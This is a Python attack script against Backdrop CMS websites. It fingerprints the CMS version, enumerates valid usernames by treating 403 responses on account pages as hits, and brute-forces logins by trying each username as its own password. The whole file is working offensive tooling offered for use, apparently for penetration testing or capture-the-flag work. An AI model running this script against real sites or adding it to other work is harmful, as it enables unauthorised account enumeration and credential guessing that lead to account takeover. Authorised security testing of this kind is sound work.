import requests
import re
from colorama import Fore,init
import threading
import signal
import argparse
import sys

init()

def def_handler(sig, frame):
   print(f'{Fore.BLUE}[{Fore.YELLOW}!{Fore.BLUE}]{Fore.WHITE} Exiting{Fore.BLUE}.{Fore.RED}.{Fore.CYAN}.')
   sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

parser = argparse.ArgumentParser()
parser.add_argument('--url', help='Website URL')
parser.add_argument('--version', action='store_true', help='List the version of BackdropCMS')
parser.add_argument('--userslist',help='Provide the list of users')
parser.add_argument('--userenum', action='store_true', help='Enumerate users')
parser.add_argument('--userpass', action='store_true', help='Attempt to log in with the user name as password')
args = parser.parse_args()

def backdropcms_version(url):
  req = requests.get(f'{url}/core/profiles/testing/testing.info')  
  pattern = r'version\s*=\s*(\d+\..*)'
  matches = re.findall(pattern, req.text)
  print(f'{Fore.BLUE}[{Fore.WHITE}+{Fore.BLUE}]{Fore.GREEN} Version{Fore.CYAN}:{Fore.CYAN} {Fore.WHITE}{matches[0]}')  

def enum_users(url,users_list):
  with open(users_list, 'r') as f:
     for username in f:
        username = username.strip()
        req = requests.get(f'{url}/?q=accounts/{username}')
        if req.status_code == 403:
          print(f'{Fore.BLUE}[{Fore.WHITE}+{Fore.BLUE}]{Fore.GREEN} Valid username: {username}')

def username_and_password(url, users_list):
  with open(users_list,'r') as f_users:
       for username in f_users:
         username = username.strip()
         payload = {
             'name': username,
             'pass': username,
             'form_build_id': 'form-jE_w6fw-VWXjWJuAxsnv3dNItFBykLxJ8xaMUWJmOEg',
             'form_id': 'user_login',
             'op': 'Log in'
         }
         req = requests.post(f'{url}?q=user/login', data=payload)
         if 'admin' in req.url:
           print(f'{Fore.BLUE}[{Fore.WHITE}+{Fore.BLUE}]{Fore.GREEN} Valid credentials: ({username}:{username})')  


if __name__ == '__main__':
  if args.url:
    if args.version:
      try:
        backdropcms_version(args.url)
      except:
        print(f'{Fore.BLUE}[{Fore.WHITE}-{Fore.BLUE}]{Fore.RED} It is not possible to detect the version')
    elif args.userslist:
        if args.userenum:
          enum_users(args.url, args.userslist)
        elif args.userpass:
          username_and_password(args.url, args.userslist)
        else:
          parser.print_help()
  else:
     parser.print_help()